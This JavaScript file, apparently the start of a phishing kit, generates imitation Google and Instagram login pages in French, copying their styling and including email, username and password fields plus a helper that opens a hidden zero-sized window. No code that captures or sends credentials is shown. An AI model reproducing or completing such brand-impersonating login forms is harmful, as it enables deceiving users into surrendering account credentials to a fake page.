const googleFrInfos = {
    googleTitle: "",
    connectionText: "Connexion",
    useText: "Utiliser votre compte google",
    forgotMailText: "Address e-mail oubliée ?",
    notComputerText: "S'il ne s'agit pas de votre ordinateur, utilisez le mode Invitée pour vous connecter en mode privée.",
    createAccountText: "Crée un compte",
    nextText: "Suivant",
}
const instagramFrInfos = {
    instagramTitle: "",
    usernamePlaceholder: "Numéro de téléphone, nom d utilisateur ou adresse courriel",
    passwordPlaceholder: "Mot de passe",
    connectionText: "Connexion",
    connectToFacebookText: "Se connecter avec Facebook",
    forgotPasswordText: "Mot de passse oublié?",
    notAccountText: "Vous n'avez pas de compte?",
    registerText: "Inscriver-vous"
}

function StringToHTMLString(str){
    if(typeof str == "string"){
        let cStr = str.replace(/</g, "&lt;");
        cStr = cStr.replace(/>/g, "&gt;");
        cStr = cStr.replace(/"/g, "&quot;");
        cStr = cStr.replace(/'/g, "&#39;");
        cStr = cStr.replace(/é/g, "&eacute");
        cStr = cStr.replace(/ê/g, "&ecirc");
        cStr = cStr.replace(/è/g, "&egrave");
        cStr = cStr.replace(/à/g, "&agrave");
        return cStr;
    }
    else{
        throw "error arguments type";
    }
}

function CreateNewWindow(){
    const wnd = window.open('', '_blank', "width=0, height=0");
    const dom = wnd.document;
    dom.open();
    dom.write("");
    dom.close();
    
    return wnd;
}
function GenerateGoogleForm(dom, divId, infos){
    if(dom instanceof Document && typeof divId == "string" && typeof infos == "object"){
        const divElem = dom.getElementById(divId);
        const style = dom.head.querySelector(".form-css-style");
        style.innerHTML = `
        body{
            margin:0;
        }
        .form-parent{
            display: flex;
            flex-direction: column;
            justify-content: center;
            height: 100vh;
        }
        .form{
            box-sizing: border-box;
            margin-left: auto;
            margin-right: auto;
            border: 1px solid rgb(218, 220, 224);
            border-radius: 8px;
            width:448px;
            height:500px;
            padding-bottom: 36px;
            padding-top:48px;
            padding-left: 40px;
            padding-right: 40px;
        }
        .form-info{
            
        }
        .form-info > div:nth-child(1){
            font-size:24px;
            font-family: sans-serif;
            text-align: center;
            padding: 16px 0px 0px;
        }
        .form-info > div:nth-child(2){
            font-size:16px;
            font-family: sans-serif;
            text-align: center;
            padding: 7px 0px 1px;
            
        }
        .form-info > div:nth-child(3){
            padding-top: 24px;
            border-left: 40px;
            border-right: 40px;

            
        }
        .form-info > div:nth-child(4){
            font-size: 14px;
            font-family: roboto, "Noto Sans Myanmar UI", arial, sans-serif;
            padding: 9px 0px 3px;
            color: rgb(26, 115, 232);
            cursor: pointer;
            letter-spacing: 0.25px;
            font-weight: 500;
            border: none;
        }
        .form-info > div:nth-child(5){
            margin-top:32px;
            padding-top:9px;
            padding-bottom:3px;
            font-size: 14px;
            font-family: roboto, "Noto Sans Myanmar UI", arial, sans-serif
        }
        .form-info > div:nth-child(6){
            display: flex;
            justify-content: space-between;
            aling-items: center;
            margin-top:32px;
        }
        .form-google-title > div:nth-child(1){
            display: block;
            height: 24px;
            text-align: center;
            font-size: 24px;
            background-image: url("svg/google-svg.svg");
            width:75px;
            margin: auto;
        }
        .form-input{
            box-sizing: border-box;
            padding-left: 15px;
            padding-right: 15px;
            padding-top: 13px;
            padding-bottom: 13px;
            font-size: 16px;
            width:100%;
            border-radius: 4px;
            border: 1px solid rgb(218, 220, 224);
            outline: none;
            font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
        }
        .form-input:focus{
            outline: 2px solid blue;
        }
        .next-button{
            background-color: rgb(26, 115, 232);
            border: none;
            padding-left: 24px;
            padding-right: 24px;
            border-radius: 4px;
            margin-top: 6px;
            margin-bottom: 6px;
            color: white;
            font-weight: 700;
            font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
            height: 36px;
        }
        .create-account{
            height: 36px;
            color: rgb(26, 115, 232);
            background-color: transparent;
            line-height: 20px;
            border: none;
            font-size: 14px;
            
        }
        .create-account:hover{
            height: 36px;
            
            background-color: rgb(200, 200, 255);
            cursor: pointer;
            
            border: none;
            border-radius: 4px;
        }
        @media screen and (max-width: 600px){
            .form-parent{
                display: block;
            }
            .form{
                border: none;
                width: 100%;
            }
        }
        `
        const formParent = dom.createElement('div');
        formParent.className = "form-parent";

        const googleTitle = infos.googleTitle;
        const connectionText = infos.connectionText;
        const useText = infos.useText;
        const mailPlaceholder = infos.mailPlaceholder;
        const forgotMailText = infos.forgotMailText;
        const notComputerText = infos.notComputerText;

        const createAccountText = infos.createAccountText;
        const nextText = infos.nextText;
        

        //form
        const form = dom.createElement('div');
        form.className = "form";
        form.innerHTML = `
        <div class = "form-google-title"><div></div></div>
        <div class = "form-info">
            <div>Connexion</div>
            <div>Utiliser votre compte google</div>
            <div>
                <input class = "form-input" type = "email" placeholder="">
            </div>
            <div>Address e-mail oubli&eacutee ?</div>
            <div>S'il ne s'agit pas de votre ordinateur, utilisez le mode Invit&eacute pour vous connecter en mode priv&eacute.</div>
            <div>
                <button class = "create-account">Cr&eacutee un compte</button>
                <button class = "next-button">Suivant</button>
            </div>
        </div>
        `;

        form.querySelector('.form-info > div:nth-child(1)').innerHTML = connectionText;
        form.querySelector('.form-info > div:nth-child(2)').innerHTML = useText;
        form.querySelector('.form-info > div:nth-child(4)').innerHTML = forgotMailText;
        form.querySelector('.form-info > div:nth-child(5)').innerHTML = notComputerText;

        form.querySelector('.create-account').innerHTML = createAccountText;
        form.querySelector('.next-button').innerHTML = nextText;



        const footer = dom.createElement('div');
        footer.className = "footer";
        footer.innerHTML = `

        `;
        form.querySelector('.next-button').onclick = () => {
            console.log("next");
        }


        formParent.appendChild(form);
        divElem.innerHTML = "";
        divElem.appendChild(formParent);
    }
    else{
        throw "error arguments type";
    }
}
function GenerateInstagramForm(dom, divId, infos){
    if(dom instanceof Document && typeof divId == "string" && typeof infos == "object"){
        const divElem = dom.getElementById(divId);
        const style = dom.head.querySelector('.form-css-style');
        style.innerHTML = `
        body{
            margin: 0;
            height: 100vh;
        }
        .insta-section{
            display: flex;
            flex-direction: column;
            height: 2000px;
        }
        .main{
            display: flex;
            flex-direction: row;
            justify-content: center;
        }
        .phone{
            width: 380px;
            background-color: gray;
            padding-right: 32px;
            padding-bottom: 12px;
        }

        .form-section{
            display: flex;
            flex-direction: column;
            justify-content: center;
            width: 350px;
        }
        .form{
            border: 1px solid lightgray;
        }

        .input-div-parent{
            margin-left: 40px;
            margin-bottom: 6px;
            margin-right: 40px;
        }
        input{
            display: block;
            font-size: 16px;
            outline: none;
            border: 1px solid lightgray;
            border-radius: 3px;
            padding-top: 9px;
            padding-left: 8px;
            padding-bottom: 7px;
            width: 100%;
        }

        .connection-button-div-parent{
            display: flex;
            flex-direction: column;
            margin-left: 40px;
            margin-top: 8px;
            margin-bottom: 8px;
            margin-right: 40px;
        }
        .connection-button{
            display: block;
            font-size:16px;
            padding-left: 16px;
            padding-right: 16px;
            padding-top: 7px;
            padding-bottom: 7px;
            aling-self: auto;
            width: 100%;
        }
        .footer{

        }
        `
    
        const usernamePlaceholder = infos.usernamePlaceholder;
        const passwordPlaceholder = infos.passwordPlaceholder;
        const connectionText = infos.connectionText;
        const connectToFacebookText = infos.connectToFacebookText;
        const forgotPasswordText = infos.forgotPasswordText;
        const notAccountText = infos.notAccountText;
        const registerText = infos.registerText;

        const instaSection = dom.createElement('div');
        instaSection.className = "insta-section";
        instaSection.innerHTML = `
        <div class = "main">
            <div class = "phone">
            </div>
            <div class = "form-section">
                <div class = "form">
                    <div class = "instagram-title"><div></div></div>
                    <div class = "form-info">
                        <div class = "input-div-parent">
                            <input class = "username-input">
                        </div>
                        <div class = "input-div-parent">
                            <input class = "password-input">
                        </div>
                        <div class = "connection-button-div-parent">
                            <button class = "connection-button"></button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class = "footer">
            <div></div>
        </div>
        `
        instaSection.querySelector('.username-input').placeholder = usernamePlaceholder;
        instaSection.querySelector('.password-input').placeholder = passwordPlaceholder;
        instaSection.querySelector('.connection-button').innerText = connectionText;
        
        divElem.innerHTML = "";
        divElem.appendChild(instaSection);
    }
    else{
        throw "error arguments type";
    }
}